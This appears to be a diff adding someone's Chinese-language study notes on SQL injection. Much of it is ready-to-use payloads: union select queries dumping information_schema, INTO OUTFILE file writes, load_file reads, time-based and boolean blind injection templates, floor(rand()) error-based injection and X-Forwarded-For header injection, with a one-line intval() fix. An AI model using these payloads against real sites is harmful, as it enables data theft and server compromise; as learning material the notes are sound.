@@ -1,0 +1,110 @@
+数据 数据库 数据库管理系统 sql
+Access数据库：非主流
+MySQL：主流
+MSSQL数据库
+
+sql注入：高危漏洞
+数据类型 数字型
+数据类型 字符型 
+返回结果 显错注入
+返回结果 盲注  
+
+1.
+基础：
+数字型：id=1' and 1=1
+存在点： 判断方式：语句是否执行（and or xor like 符号（减号 单引号 ）测试；
+http://^^^id=123
+参数名字（id)
+参数值（123）
+COOKIE:
+目录名、文件名：
+
+2.
+小进阶：
+(1).字符型：title=vulkey' and 1=1 --+
+#以后不执行  / --%20  /  --+
+union（联合查询）：连接两个select语句 使两者均执行
+1. 注入点查询的语句实际上有多少个列名（即* 代表多少列（id,username……）  order by 1，2，3……
+2.把union select查询出来的东西显示出来
+3.其他表的名字（查询表存不存在）：exists()  用法如：http://……?id=1 and exist(select *from 表名）--+存在有结果 否则无结果
+进而可查表中列存不存在：exists(select 列名 from 已知表名）
+库名：exists(select * from 不存在表名）：就行
+
+dbname
+tablename
+columename
+order by:列数
+union select
+
+
+步骤：
+1.判断注入点
+2.order by 查列数
+3.and exists(select * from 表名) 查询表名，列名 
+4.union select 联合查询 获取数据
+
+
+(2)搜索型：" %
+from db_name.table_name
+表名：union select 1,table_name,3 from information_schema.tables where table_schema='…' and table_name<>'…'--+
+						不等于
+列名：union select 1,column_name,3 from information_schema.columns where table_schema='…' and table_name='…'--+
+直接查出所有列：union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='…'and table_name='…'--+
+
+写入文件：
+条件：
+1.绝对路径
+D:/www.
+2.最高权限
+mysql - root
+union select 1,"写入内容",3 into outfile "绝对路径/xxx.txt"--+
+
+读取文件：
+load_file(文件路径):导入文件
+replace():替换
+hex():转换16进制
+hex(load_file())
+union select 1,hex(load_file(文件路径)),3--+
+
+3.盲注:
+(1).布尔盲注：and user()='……"
+	and user like 'r%'  模糊匹配
+(2).时间盲注：and sleep(5)： 延时5秒，返回0
+使用if(),substring()-同mid()   mid('字符串',起点位置,截取长度)
+sleep() - 秒 - 一个参数
+if() - （三个参数）- （条件，真返回，假返回）
+mid() - （三个参数）- 截取字符串
+ascii() - （一个参数）- 转换为ascii码值
+
+步骤：
+1.and if(length(user()) = 0,sleep(5),1) - 长度
+2.and if(ascii(mid(user(),$1-len$,1)) = $0-127$ ,sleep(5),1) - (burp) - 得到每一位
+简化：
+and if(mid(user(),$1-len$,1) like '$a-z$',sleep(5),1)
+
+
+4.报错注入：返回值+报错
+例子： and select count(*) from information_schema.tables group by floor(rand(0)*2);
+若语句报错：以上整体做from的表 and (select 1 from (select count(*),(floor(rand(0)*2)a from information_schema.tables group by a)x);
+and (select 1 from (select count(*),(concat((可执行语句),0x7e,floor(rand(0)*2)))a from information_schema.tables group by a)x);
+报错：count(*),rand(),group by 缺一不可
+函数:
+count()：-一个参数-返回非null行的数目  select count()
+rand()：-一个参数-产生随机浮点值（重复序列）v（范围0-1.0）select rand()  可乘* rand()*2
+group by:聚合函数-同order by  返回一个组
+floor():取整函数
+concat(str1,str2):连接字符串
+floor(rand(0)*2)-确定性-报错，记录必须3条以上，而且3条以上必定报错
+floor(rand()*2)-不确定性-报错随机——rand()内参数有影响
+绝对报错：from中 记录三条以上
+相对报错：
+
+5.另类注入：
+Base64编码注入：注入点 先用Base64编码，再代入sql语句 语句内部先解码base64_decode($_GET['id'])
+XFF头注入：X-Forwarded-For  --记录IP 可用burp修改绕过
+
+修复：
+1.整数型注入点：intval()函数：$id=isset($_GET['id]')?intval($_GET['id']):1;
+
+range(a,b)：产生从a到b的数组
+in_array(待查找项,数组):判断b中是否含a
